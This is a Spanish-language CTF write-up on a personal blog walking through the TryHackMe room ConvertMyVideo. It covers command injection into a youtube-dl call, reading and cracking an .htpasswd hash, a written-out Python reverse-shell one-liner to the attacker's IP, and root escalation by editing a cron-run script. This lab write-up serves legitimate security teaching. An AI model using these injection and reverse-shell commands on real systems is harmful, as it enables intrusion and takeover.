<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>TryHackMe - ConvertMyVideo :: sckull — TryHackMe, HackTheBox, CTF Writeups</title>    
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Titulo ConvertMyVideo     Room ConvertMyVideo   Info My Script to convert videos to MP3 is super secure   Puntos 320   Dificultad Media   Maker overjt    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.
# Nmap 7.80 scan initiated Tue May 5 19:02:47 2020 as: nmap -sV -o nmap_scan_mini convertmyvideo."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/convertmyvideo/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="TryHackMe - ConvertMyVideo :: sckull — TryHackMe, HackTheBox, CTF Writeups" />
<meta name="twitter:description" content="Titulo ConvertMyVideo     Room ConvertMyVideo   Info My Script to convert videos to MP3 is super secure   Puntos 320   Dificultad Media   Maker overjt    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.
# Nmap 7.80 scan initiated Tue May 5 19:02:47 2020 as: nmap -sV -o nmap_scan_mini convertmyvideo." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/tryhackme/convertmyvideo/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="TryHackMe - ConvertMyVideo :: sckull — TryHackMe, HackTheBox, CTF Writeups">
<meta property="og:description" content="Titulo ConvertMyVideo     Room ConvertMyVideo   Info My Script to convert videos to MP3 is super secure   Puntos 320   Dificultad Media   Maker overjt    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.
# Nmap 7.80 scan initiated Tue May 5 19:02:47 2020 as: nmap -sV -o nmap_scan_mini convertmyvideo." />
<meta property="og:url" content="https://sckull.github.io/posts/convertmyvideo/" />
<meta property="og:site_name" content="TryHackMe - ConvertMyVideo" />
<meta property="og:image" content="https://sckull.github.io/image/tryhackme/convertmyvideo/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "TryHackMe - ConvertMyVideo",
        "headline" : "TryHackMe - ConvertMyVideo",
        "description" : "Titulo ConvertMyVideo     Room ConvertMyVideo   Info My Script to convert videos to MP3 is super secure   Puntos 320   Dificultad Media   Maker overjt    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.
# Nmap 7.80 scan initiated Tue May 5 19:02:47 2020 as: nmap -sV -o nmap_scan_mini convertmyvideo.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2020",
        "datePublished": "2020-05-05 00:00:00 &#43;0000 UTC",
        "dateModified" : "2020-05-05 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/convertmyvideo/",
        "wordCount" : "743",
        "keywords" : [ "tryhackme","linux","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2020-05-05 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">TryHackMe - ConvertMyVideo</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Tuesday, May 5, 2020
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 4 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/tryhackme/"><li class="fa fa-tag"></li> tryhackme</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/linux/"><li class="fa fa-tag"></li> linux</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/convertmyvideo/../../image/tryhackme/convertmyvideo/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#nmap">NMAP</a></li>
<li><a href="#http">HTTP</a>
<ul>
<li><a href="#gobuster">GOBUSTER</a></li>
</ul></li>
<li><a href="#command-injection">COMMAND INJECTION</a></li>
<li><a href="#user-www-data">USER - WWW-DATA</a></li>
<li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Titulo</th>
<th>ConvertMyVideo</th>
</tr>
</thead>

<tbody>
<tr>
<td>Room</td>
<td>ConvertMyVideo</td>
</tr>

<tr>
<td>Info</td>
<td>My Script to convert videos to MP3 is super secure</td>
</tr>

<tr>
<td>Puntos</td>
<td>320</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Media</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://tryhackme.com/p/overjt">overjt</a></td>
</tr>
</tbody>
</table>

<h2 id="nmap">NMAP</h2>

<p>Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.</p>

<pre><code class="language-bash"># Nmap 7.80 scan initiated Tue May  5 19:02:47 2020 as: nmap -sV -o nmap_scan_mini convertmyvideo.thm
Nmap scan report for convertmyvideo.thm (10.10.1.154)
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May  5 19:03:30 2020 -- 1 IP address (1 host up) scanned in 43.02 seconds
</code></pre>

<h2 id="http">HTTP</h2>

<p>Encontramos una pagina sencilla en el puerto 80, en la que nos muestra un formulario en donde nos pide un ID de un video de YouTube.
<img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_185935.png" alt="image" /></p>

<h3 id="gobuster">GOBUSTER</h3>

<p>Utilizamos gobuster para busqueda de directorios y archivos.</p>

<pre><code class="language-bash">root@upset:~/thm/convertmyvideo# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://convertmyvideo.thm/ -q -t 25 -x php,html,txt
/admin (Status: 401)
/images (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/tmp (Status: 301)
</code></pre>

<p>Dentro del codigo fuente de la pagina encontramos el codigo de envio del ID en Javascript, el cual envia la URL de youtube añadiendole el ID.
<img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_191521.png" alt="image" /></p>

<p>Utilizamos Burpsuite para capturar el envio de el ID, le agregamos un ID erroneo y nos da una respuesta en el que nos devuelve el error que se generó.
<img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_191641.png" alt="image" /></p>

<h2 id="command-injection">COMMAND INJECTION</h2>

<p>Eliminamos la URL y enviamos algo diferente, y vemos que el mensaje de error contiene el nombre de una herramienta que se utiliza para descargar videos de YouTube - youtube-dl.
<img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_191917.png" alt="image" /></p>

<p>Para verificar que esa herramienta esta siendo utilizada con la pagina, enviamos la flag <code>--help</code> para confirmar que es esa herramienta, y nos devolvió todas las opciones.</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_192145.png" alt="image" /></p>

<p>Al parecer la pagina esta utilizando youtube-dl para pasarle la url con el ID que ingresamos, mediante la ejecucion de la herramienta a traves de consola. Intentamos romper este comando y sus parametros, utilizamos <a href="https://owasp.org/www-community/attacks/Command_Injection"><strong>command injection</strong></a>, con <code>|</code> y el comando <code>id</code> más el separador <code>;</code> (punto y coma) esto para separar y no ejecutar los parametros adicionales. Logramos ejecutar el comando.</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_205754.png" alt="image" /></p>

<p>Ahora que podemos ejecutar comandos, comenzamos a enumerar los archivos que estan en la maquina, vemos que la direccion donde estamos es en <code>/var/www/html</code> y los archivos que se encuentran en esa direccion.</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_211638.png" alt="image" /></p>

<p>Logramos obtener el codigo fuente de index.php utilizando <code>cat{$IFS}index.php</code> (utilizamos <code>{$IFS}</code> para agregar espacios).</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_211743.png" alt="image" /></p>

<p>Vemos en el codigo fuente que ejecuta el comando youtube-dl con sus parametros y en medio pasa la URL que es ingresada por el usuario.</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_212232.png" alt="image" /></p>

<p>Vemos la carpeta de admin, la cual contiene un <code>index.php</code> y <code>flag.txt</code>.</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_212555.png" alt="image" /></p>

<p>Intentamos realizar cat a la <strong>flag.txt</strong> y obtenemos la primera.</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_213821.png" alt="image" /></p>

<p>Enumeramos la carpeta nuevamente con mas profundidad y econtramos el archivo <code>.htaccess</code>.</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_213123.png" alt="image" /></p>

<p><strong>Ejecucion de Comando</strong></p>

<pre><code class="language-bash">total 36
drwxr-xr-x 6 www-data www-data 4096 Apr 12 04:42 .
drwxr-xr-x 3 root     root     4096 Apr 12 01:07 ..
-rw-r--r-- 1 www-data www-data  152 Apr 12 03:58 .htaccess
drwxr-xr-x 2 www-data www-data 4096 Apr 12 05:05 admin
drwxrwxr-x 2 www-data www-data 4096 Apr 12 04:26 images
-rw-r--r-- 1 www-data www-data 1790 Apr 12 04:55 index.php
drwxrwxr-x 2 www-data www-data 4096 Apr 12 04:44 js
-rw-rw-r-- 1 www-data www-data  205 Apr 12 04:40 style.css
drwxr-xr-x 2 www-data www-data 4096 Apr 12 05:13 tmp
</code></pre>

<p>El archivo contiene lo siguiente y al parecer hay un archivo <code>.htpasswd</code> en la carpeta <code>admin</code>.</p>

<pre><code class="language-bash">&lt;Files /admin/.htpasswd&gt;
Order allow,deny
Deny from all
&lt;/Files&gt;

&lt;Files /admin/.htaccess&gt;
Order allow,deny
Deny from all
&lt;/Files&gt;
 
Options -Indexes
</code></pre>

<p>Hacemos cat al archivo y logramos obtener un usuario y contraseña encriptada.
<img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_213751.png" alt="image" /></p>

<p>Utilizamos john para obtener la contraseña.
<img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_214203.png" alt="image" /></p>

<p>Ingresamos a la pagina utilizando el panel de <code>/admin</code> y vemos un boton que al presionarlo realiza la ejecucion de un comando.</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_214331.png" alt="image" /></p>

<p>Vemos que podemos ejecutar comandos:</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_214431.png" alt="image" /></p>

<h2 id="user-www-data">USER - WWW-DATA</h2>

<p>Utilizamos python para ejecutar nuestra shell inversa y ponemos a la escucha nuestro netcat.</p>

<pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.18.1.160&quot;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre>

<p>Logramos obtener una shell con usuario <code>www-data</code></p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_215113.png" alt="image" /></p>

<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>

<p>Mediante una enumeracion basica de binarios no encontramos alguno que nos puediera ayudar, utilizamos <code>pspy</code> para ver si existe algun cronjob en la maquina. Encontramos que se ejecuta un cronjob el cual ejecuta el archivo <code>clean.sh</code> que se encuentra en <code>/var/www/html/tmp/</code>.</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_222133.png" alt="image" /></p>

<p>Agregamos una shell inversa a este archivo y pusimos a la escucha netcat, logramos obtener una shell con usuario root y nuestra flag <strong>root.txt</strong>.</p>

<p><img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_222340.png" alt="image" />
<img src="../../image/tryhackme/convertmyvideo/Screenshot_20200505_222433.png" alt="image" /></p>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/cicada3301vol1/">
                <span class="button__icon">←</span>
                <span class="button__text">TryHackMe - Cicada-3301 Vol:1</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/nax/">
                <span class="button__text">TryHackMe - Nax</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>




  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>



</body>
</html>
